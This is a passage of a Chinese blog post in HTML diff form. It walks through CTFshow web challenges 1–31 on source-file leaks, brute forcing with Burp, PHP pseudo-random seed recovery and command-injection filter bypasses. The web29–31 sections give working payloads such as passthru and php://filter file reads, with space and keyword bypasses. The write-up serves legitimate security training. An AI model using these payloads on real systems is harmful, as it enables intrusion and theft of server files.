+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>13k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>12 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>flag在源代码里</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>方法一：bp抓包，POST源码</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115164912202.png" alt="image-20220115164912202"></p>
+<p>方法二：URL前加view-source：</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115165115804.png" alt="image-20220115165115804"></p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>bp抓包，查看响应包</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115170052755.png" alt="image-20220115170052755"></p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="/2022/03/08/CTFshow/image-20220115204306731.png" alt="image-20220115204306731"></p>
+<p>访问robots.txt</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115204339638.png" alt="image-20220115204339638"></p>
+<p>flag在flagishere.txt里</p>
+<p>robots.txt是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据robots.txt文件的内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减少搜索引擎蜘蛛的工作量。</p>
+<p>当搜索引擎蜘蛛访问网站时，它会首先检查该站点根目录下是否存在robots.txt文件，如果该文件存在，搜索引擎蜘蛛就会按照该文件中的内容来确定爬行的范围；如果该文件不存在，则所有的搜索引擎蜘蛛将能够访问网站上所有没有被口令保护的页面。</p>
+<p>通常搜索引擎对网站派出的蜘蛛是有配额的，多大规模的网站放出多少蜘蛛。如果我们不配置robots文件，那么蜘蛛来到网站以后会无目的的爬行，造成的一个结果就是，需要它爬行的目录，没有爬行到，不需要爬行的，也就是我们不想被收录的内容却被爬行并放出快照。所以robots文件对于我们做网站优化来说具有很重要的影响。</p>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><img src="/2022/03/08/CTFshow/image-20220115204605393.png" alt="image-20220115204605393"></p>
+<p>phps文件泄露 phps源码访问：index.phps</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115204702358.png" alt="image-20220115204702358"></p>
+<p>index.phps 其用于查看php的源代码<img src="/2022/03/08/CTFshow/image-20220115205037263.png" alt="image-20220115205037263" style="zoom:67%;"></p>
+<p>phps即为 PHP Source，phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替</p>
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p><img src="/2022/03/08/CTFshow/image-20220115210116656.png" alt="image-20220115210116656"></p>
+<p>bp抓包源码出不来，网站源码泄露，访问<a target="_blank" rel="noopener" href="http://www.zip获取网站源码/">www.zip获取网站源码</a></p>
+<p><a href="http://www.zip:网站的文件都是放置在www文件夹下面的,WWW文件夹里面的文件全部压缩在[www.zip](http://www.zip)里面了。">www.zip:网站的文件都是放置在www文件夹下面的,WWW文件夹里面的文件全部压缩在[www.zip](http://www.zip)里面了。</a></p>
+<p>解压后：<img src="/2022/03/08/CTFshow/image-20220115210543987.png" alt="image-20220115210543987"></p>
+<p>为假的flag</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115210710041.png" alt="image-20220115210710041"></p>
+<p>在网页打开文件，直接访问</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115210734790.png" alt="image-20220115210734790"></p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p><img src="/2022/03/08/CTFshow/image-20220115221144978.png" alt="image-20220115221144978"></p>
+<p>.开头的文件在Linux为隐藏文件夹，这为版本控制系统，多人协作，git可以版本控制，每个人的代码放到仓库中</p>
+<p> .git文件夹是git init后在当前目录生成的一个管理git仓库的文件夹，这里包含所有git操作所需要的东西</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115221125272.png" alt="image-20220115221125272"></p>
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p><img src="/2022/03/08/CTFshow/image-20220115221452471.png" alt="image-20220115221452471"></p>
+<p>同样为这个</p>
+<p>.git 没反应</p>
+<p>.svn</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115221625932.png" alt="image-20220115221625932"></p>
+<p>svn泄露</p>
+<p>svn仍为版本控制系统</p>
+<p>协作开发需要版本控制系统，git和SVN，应该是目前使用最多的两个版本控制系统。在Linux环境下git，是命令行的方式，现在在Windows下，与tortoiseSVN一样，有tortoisegit，不过需要先安装git（msysgit）。</p>
+<p>git与SVN的区别0</p>
+<p>1.git是分布式的，SVN是集中式的</p>
+<p>开发人员可以建立自己的分支，并在自己的分支上进行操作，减少了冲突</p>
+<p>2.git可以在没有网络的情况下使用</p>
+<p>从远程库clone一个到本地库，没有网络的情况下，可以将修改提交到本地库，等有网的时候再传上去。</p>
+<p>3.git和SVN的版本控制</p>
+<p>是通过.git和.svn文件，.git只是在本地的版本库的目录下存在，而.svn存在于每一个文件夹，当我们不需要版本控制的时候，要删除.svn很费时。</p>
+<p>4.版本号问题</p>
+<p>svn有明确的版本号，git对于每一个版本，都通过SHA1算法生成一个唯一标示的码，方便追溯到之前的版本。</p>
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p><img src="/2022/03/08/CTFshow/image-20220115222114188.png" alt="image-20220115222114188"></p>
+<p>vim缓存文件泄露</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115222503948.png" alt="image-20220115222503948"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220115222551664.png" alt="image-20220115222551664"></p>
+<p>在生产环境下，在vim非正常退出的情况下，会产生一个交换文件，.php.swp，里面有还没有完成的内容</p>
+<p>使用vi/vim，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)swp文件 以备不测（不测下面讨论），如果你正常退出，那么这个这个swp文件将会自动删除 。下面说不测。<br> 不测分为：<br> 1 当你用多个程序编辑同一个文件时。<br> 2 非常规退出时。</p>
+<p><img src="/2022/03/08/CTFshow/image-20220115224231678.png" alt="image-20220115224231678"></p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p><img src="/2022/03/08/CTFshow/image-20220115224616061.png" alt="image-20220115224616061"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220115224847800.png" alt="image-20220115224847800"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220115224902121.png" alt="image-20220115224902121"></p>
+<p>URL解码：</p>
+<p>./CTFshow{b07aa290-1d42-4d61-b993-6b3e27dbf1ea}</p>
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p><img src="/2022/03/08/CTFshow/image-20220116134407774.png" alt="image-20220116134407774"></p>
+<p>在线域名解析</p>
+<img src="/2022/03/08/CTFshow/image-20220116134911085.png" alt="image-20220116134911085" style="zoom:67%;">
+
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p><img src="/2022/03/08/CTFshow/image-20220116135003467.png" alt="image-20220116135003467"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116135617684.png" alt="image-20220116135617684"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116135532861.png" alt="image-20220116135532861"></p>
+<p>用户名：admin 密码：372619038</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116135844808.png" alt="image-20220116135844808"></p>
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p><img src="/2022/03/08/CTFshow/image-20220116141900525.png" alt="image-20220116141900525"></p>
+<p>找到技术文档</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116142105448.png" alt="image-20220116142105448"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116142117466.png" alt="image-20220116142117466"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116142252074.png" alt="image-20220116142252074"></p>
+<p>登录后<img src="/2022/03/08/CTFshow/image-20220116142348164.png" alt="image-20220116142348164"></p>
+<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p><img src="/2022/03/08/CTFshow/image-20220116142752905.png" alt="image-20220116142752905"></p>
+<p>提示访问editor</p>
+<img src="/2022/03/08/CTFshow/image-20220116143037122.png" alt="image-20220116143037122" style="zoom:67%;">
+
+<p>图片空间里面找到一个文件<img src="/2022/03/08/CTFshow/image-20220116143629362.png" alt="image-20220116143629362"></p>
+<img src="/2022/03/08/CTFshow/image-20220116143552228.png" alt="image-20220116143552228" style="zoom:67%;">
+
+<img src="/2022/03/08/CTFshow/image-20220116143754042.png" alt="image-20220116143754042" style="zoom:67%;">
+
+<p>不对</p>
+<p>nothinghere文件夹里的fl000g.txt</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116144035834.png" alt="image-20220116144035834"></p>
+<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p><img src="/2022/03/08/CTFshow/image-20220116144246693.png" alt="image-20220116144246693"></p>
+<img src="/2022/03/08/CTFshow/image-20220116144409085.png" alt="image-20220116144409085" style="zoom:67%;">
+
+<img src="/2022/03/08/CTFshow/image-20220116144448192.png" alt="image-20220116144448192" style="zoom:33%;">
+
+<p>点击忘记密码：</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116144736889.png" alt="image-20220116144736889"></p>
+<p>搜素刚刚的QQ，陕西西安</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116144839363.png" alt="image-20220116144839363"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116144920937.png" alt="image-20220116144920937"></p>
+<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p><img src="/2022/03/08/CTFshow/image-20220116145025640.png" alt="image-20220116145025640"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116145520659.png" alt="image-20220116145520659"></p>
+<p>默认探针名字：tz.php</p>
+<img src="/2022/03/08/CTFshow/image-20220116150323740.png" alt="image-20220116150323740" style="zoom:67%;">
+
+<p><img src="/2022/03/08/CTFshow/image-20220116150618762.png" alt="image-20220116150618762"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116150644760.png" alt="image-20220116150644760"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116150722008.png" alt="image-20220116150722008"></p>
+<p>可以点，点进去</p>
+<p>在环境哪儿：<img src="/2022/03/08/CTFshow/image-20220116150834750.png" alt="image-20220116150834750"></p>
+<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p><img src="/2022/03/08/CTFshow/image-20220116151831468.png" alt="image-20220116151831468"></p>
+<p>备份的sql文件：backup.sql</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116153458454.png" alt="image-20220116153458454"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116153607572.png" alt="image-20220116153607572"></p>
+<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p><img src="/2022/03/08/CTFshow/image-20220116153831221.png" alt="image-20220116153831221"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116154606705.png" alt="image-20220116154606705"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116154622944.png" alt="image-20220116154622944"></p>
+<p>若分数大于100，会弹出一个框</p>
+<p>这是Unicode编码，解码后：<img src="/2022/03/08/CTFshow/image-20220116154949245.png" alt="image-20220116154949245"></p>
+<p>110.php看看<img src="/2022/03/08/CTFshow/image-20220116155025878.png" alt="image-20220116155025878"></p>
+<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p><img src="/2022/03/08/CTFshow/image-20220116155402143.png" alt="image-20220116155402143"></p>
+<p>查看网页源代码</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116155602966.png" alt="image-20220116155602966"></p>
+<p>输入仍为错误，前端有加密</p>
+<p>用bp抓包修改<img src="/2022/03/08/CTFshow/image-20220116155944387.png" alt="image-20220116155944387"></p>
+<p>在此修改</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116160044874.png" alt="image-20220116160044874"></p>
+<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdb文件是早期asp+<span class="keyword">access</span>构架的数据库文件，文件泄露相当于数据库被脱裤了。</span><br></pre></td></tr></table></figure>
+
+<p>db目录，数据库作为一个文件存储，访问/db/db.mdb，下载文件。mdb是一种文件格式，它是Access数据库的一种文件存储格式，由于对数据操作的方便性，常用在一些中小型程序中；对于mdb格式的文件可以用Access打开。</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116160830902.png"></p>
+<p>用记事本打开，搜索flag<img src="/2022/03/08/CTFshow/image-20220116162609743.png" alt="image-20220116162609743"></p>
+<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>用bp抓包</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116202537401.png" alt="image-20220116202537401"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116203852617.png" alt="image-20220116203852617"></p>
+<p>是输入的用户密码，不过中间带了冒号</p>
+<img src="/2022/03/08/CTFshow/image-20220116171821919.png" alt="image-20220116171821919" style="zoom:67%;">
+
+<p>payload2(密码)：导入提供的字典，base64加密</p>
+<img src="/2022/03/08/CTFshow/image-20220116204048032.png" alt="image-20220116204048032" style="zoom:67%;">
+
+<p>payload1和payload2都需要取消勾选</p>
+<p><img src="/2022/03/08/CTFshow/image-20220116203131650.png" alt="image-20220116203131650"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220116204646221.png" alt="image-20220116204646221"></p>
+<p>查看响应包<img src="/2022/03/08/CTFshow/image-20220116204721558.png" alt="image-20220116204721558" style="zoom:67%;"></p>
+<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p><img src="/2022/03/08/CTFshow/image-20220118111615441.png" alt="image-20220118111615441"></p>
+<p>子域名收集与爆破工具</p>
+<p>1.查询DNS解析记录</p>
+<p>如 MX CNAME 记录，使用 nslookup 命令就可以查询这些信息。查询DNS记录的方法，通过域名的NS服务器可以用”ls <a target="_blank" rel="noopener" href="http://domain.com&quot;的方式查询所有域名相关记录,但是可惜,现在的dns服务器大都禁用了这个功能以提高安全性./">http://domain.com&quot;的方式查询所有域名相关记录，但是可惜，现在的DNS服务器大都禁用了这个功能以提高安全性。</a></p>
+<p>2.爬虫提取子域名</p>
+<p>这类工具有很多，例如 burpsuite、appscan、awvs 都有爬虫的功能<img src="/2022/03/08/CTFshow/image-20220118114241220.png" alt="image-20220118114241220"></p>
+<p>3.搜索引擎</p>
+<p>搜索引擎提供了一些高级搜索指令，site 就可以查询相关的域名，其实搜索引起收录的网页也是通过爬虫来爬取的。</p>
+<img src="/2022/03/08/CTFshow/image-20220118114324854.png" alt="image-20220118114324854" style="zoom:67%;">
+
+<p>4.站点配置文件</p>
+<p>crossdomain.xml，跨域策略配置文件<br> robots.txt，反爬虫配置文件，Robots 协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取</p>
+<p>5.爆破的原理其实是通过枚举的方式来实现的（爆破域名顾名思义就是枚举的意思）枚举域名的A记录。例如，如果要爆破 test.com 的子域名</p>
+<pre><code>首先的访问一个随机并不存在的域 abc.test.com
+取得A记录后保存
+开始枚举a-z0-9，比如1.test.com、 2.test.com 、3.test.com之类的。
+接下来的步骤就分为两种方式了。
+第一种：直接获取1.test.com 2.test.com 3.test.com的A记录，有 A 记录则表示存在也是可行的，但是如果遇到泛解析则该方法失效。
+第二种，在泛解析的下也可以使用，把这些枚举的域名 A 记录与之前abc.test.com的A记录做对比，不同的则是存在A记录的域名，也就是在用的域名
+</code></pre>
+<p>6.在线平台一部分是穷举，此类跟本地的工具效果是一样的；另外一类是搜索引擎，通过 Alexa 和 Google 搜索，简单快捷，缺点是可能会缺少某些浏览量较低的域名，不是特别全面。在线平台特别多，在此举几个例子</p>
+<p>暴力破解<br><a target="_blank" rel="noopener" href="http://z.zcjun.com/">http://z.zcjun.com/</a><br><a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br><a target="_blank" rel="noopener" href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></p>
+<p>搜索引擎收录<br><a target="_blank" rel="noopener" href="http://alexa.chinaz.com/">http://alexa.chinaz.com</a></p>
+<img src="/2022/03/08/CTFshow/image-20220118124922303.png" alt="image-20220118124922303" style="zoom:67%;">
+
+<p>vip.ctf.show</p>
+<img src="/2022/03/08/CTFshow/image-20220118123418810.png" alt="image-20220118123418810" style="zoom:67%;">
+
+<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还爆破？这么多代码，告辞！</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dict</span> = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=md5(<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&#x27;原字符串为:&#x27;</span>.<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&#x27;加密后字符串为:&#x27;</span>.<span class="variable">$token</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(<span class="selector-tag">a</span>,<span class="selector-tag">b</span>,c)函数，返回<span class="selector-tag">a</span>字符串，从<span class="selector-tag">b</span>开始，长度为c的字符串</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/08/CTFshow/image-20220119113632889.png" alt="image-20220119113632889"></p>
+<p>点. 在php中用来连接两个字符串或变量的。</p>
+<p><strong>intval()</strong> 函数用于获取变量的整数值。<strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p>
+<p><img src="/2022/03/08/CTFshow/image-20220119112943153.png" alt="image-20220119112943153"></p>
+<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p><img src="/2022/03/08/CTFshow/image-20220119140956990.png" alt="image-20220119140956990"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220119141021376.png" alt="image-20220119141021376"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220119141051254.png" alt="image-20220119141051254"></p>
+<p><strong>php伪随机数：</strong></p>
+<p>php伪随机数漏洞，php中重要的几个随机函数rand() 不指定参数时，范围0-32767，mt_rand() 不指定参数时，范围0-2^32-1srand() 给rand()函数播种，mt_srand() 给mt_srand()函数播种php是基于C开发的，C中生成随机数时，需要自己去一个种子，相同的种子产生的随机数是相同的，php中也一样，自己的理解：mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。所以，当种子一定时，接下来几次的随机数都是固定的</p>
+<p>mt_srand()函数播种的时候，只有在第一次调用mt_rand()函数的时候才会使用。所以如果我们知道了第一次生成的随机数值，就可能爆破出随机数种子。</p>
+<p>那 为什么是 伪随机数呢？</p>
+<p><strong>因为同一个种子产生的随机数只会根据调用次数的不同产生不同的数。</strong></p>
+<p> <strong>漏洞产生</strong></p>
+<p>所以显而易见，随机数的产生，基于种子。但是，可以通过产生的随机数来猜测种子，进而推测后续的随机数。</p>
+<p>需要指明的是，不同版本的php，同一个种子产生的随机数有可能不同。</p>
+<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p><img src="/2022/03/08/CTFshow/image-20220119145040246.png" alt="image-20220119145040246"></p>
+<p>由源码可以发现我们可以利用r=0得到mt_rand()相反的值</p>
+<p><img src="/2022/03/08/CTFshow/image-20220119145020124.png" alt="image-20220119145020124"></p>
+<p>使用php_mt_seed 回推出种子<img src="/2022/03/08/CTFshow/image-20220119155222121.png" alt="image-20220119155222121"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220119165355955.png" alt="image-20220119165355955"></p>
+<p>r=mt_rand  token=mt_rand+mt_rand  上面种子一个一个试</p>
+<p><img src="/2022/03/08/CTFshow/image-20220119165335174.png" alt="image-20220119165335174"></p>
+<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p><img src="/2022/03/08/CTFshow/image-20220119192222187.png" alt="image-20220119192222187"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220119191300328.png" alt="image-20220119191300328"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220119192015391.png" alt="image-20220119192015391"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220119192042083.png" alt="image-20220119192042083"></p>
+<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p><img src="/2022/03/08/CTFshow/image-20220119194102280.png" alt="image-20220119194102280"></p>
+<p>打开录取名单</p>
+<img src="/2022/03/08/CTFshow/image-20220119194645996.png" alt="image-20220119194645996" style="zoom:67%;">
+
+<p>打开学生学籍信息查询系统，查学号</p>
+<p><img src="/2022/03/08/CTFshow/image-20220119194716613.png" alt="image-20220119194716613"></p>
+<p>需要爆破出生日，火狐抓取不到这个，查看网页源代码<img src="/2022/03/08/CTFshow/image-20220120222355359.png" alt="image-20220120222355359"></p>
+<p>打开这个页面，就是网页源代码里的文件  post传参<img src="/2022/03/08/CTFshow/image-20220120221550505.png" alt="image-20220120221550505"></p>
+<p>在bp里面加入第二个变量p<img src="/2022/03/08/CTFshow/image-20220120215012942.png" alt="image-20220120215012942"></p>
+<p>构造payloads<img src="/2022/03/08/CTFshow/image-20220120215219382.png" alt="image-20220120215219382"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220120221628641.png" alt="image-20220120221628641"></p>
+<p>\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a02015237 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801</p>
+<p>Unicode解码：恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码 621022199002015237<img src="/2022/03/08/CTFshow/image-20220120222045923.png" alt="image-20220120222045923"></p>
+<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p><img src="/2022/03/08/CTFshow/image-20220121150757284.png" alt="image-20220121150757284"></p>
+<p>诡异的0/1</p>
+<p>爆破目录,去掉2.txt<img src="/2022/03/08/CTFshow/image-20220121150936152.png" alt="image-20220121150936152"></p>
+<p>选择模式Cluster bomb</p>
+<p><img src="/2022/03/08/CTFshow/image-20220121151034044.png" alt="image-20220121151034044"></p>
+<p>构造payloads，payload1与payload2 都为数字<img src="/2022/03/08/CTFshow/image-20220121151258500.png" alt="image-20220121151258500"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220121152107557.png" alt="image-20220121152107557"></p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p><img src="/2022/03/08/CTFshow/image-20220121155601615.png" alt="image-20220121155601615"></p>
+<p>过滤了flag ，eval():可以接受一个字符串str作为参数，并把这个参数作为脚本代码来执行。<strong>命令执行：带system(“”);</strong> <strong>绕过flag，通过*省略或者？代替</strong></p>
+<p><img src="/2022/03/08/CTFshow/image-20220121160527232.png" alt="image-20220121160527232"></p>
+<p>页面无显示，然后查看网页源代码<img src="/2022/03/08/CTFshow/image-20220121160609695.png" alt="image-20220121160609695"></p>
+<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p><img src="/2022/03/08/CTFshow/image-20220121163156964.png" alt="image-20220121163156964"></p>
+<p>过滤了flag，php,system</p>
+<p>方法一：</p>
+<p><img src="/2022/03/08/CTFshow/image-20220121163736641.png" alt="image-20220121163736641"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220121163916210.png" alt="image-20220121163916210"></p>
+<p>tac命令：反序输出文件的内容，文件的最后一行显示在第一行</p>
+<p>cat命令用不了可能被过滤了</p>
+<p>方法二：</p>
+<p>过滤了system，只能用其他命令执行函数</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">shell_exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">popen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">proc_open</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">pcntl_exec</span><span class="params">()</span></span></span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+
+<p>这里需要注意一下，只有system函数是有回显的，其他的函数可以通过echo等显示</p>
+<p>这里采用反引号绕过<img src="/2022/03/08/CTFshow/image-20220121165055553.png" alt="image-20220121165055553"></p>
+<p>查看网页源代码即可得到flag</p>
+<p>方法三：采用passthru()函数：payload：?c=passthru(“cat fla*”);</p>
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="/2022/03/08/CTFshow/image-20220121223323191.png" alt="image-20220121223323191"></p>
+<p>过滤了system|cat|flag|空格单引号</p>
+<p>方法一：<img src="/2022/03/08/CTFshow/image-20220121223757658.png" alt="image-20220121223757658"></p>
+<p>a=system(“cat flag.php”); 之后查看网页源代码得到flag</p>
+<p>方法二：</p>
+<p><strong>空格绕过</strong>                                                                                                                                                 </p>
+<blockquote>
+<p>&lt; &lt;&gt; 重定向符<br>%09(需要php环境)<br>${IFS}<br>$IFS$9<br>{cat,flag.php} //用逗号实现了空格功能<br>%20<br>%09</p>
+</blockquote>
+<p><strong>cat被过滤</strong>                                                                                                                                                                             </p>
+<p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p>
+<p>payload: ?c=passthru(“more%09f*”);   <img src="/2022/03/08/CTFshow/image-20220121225223264.png" alt="image-20220121225223264"></p>
+<p>加反引号</p>
+<p>payload：?c=include($_GET[“url”]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php           在base64解码即可</p>
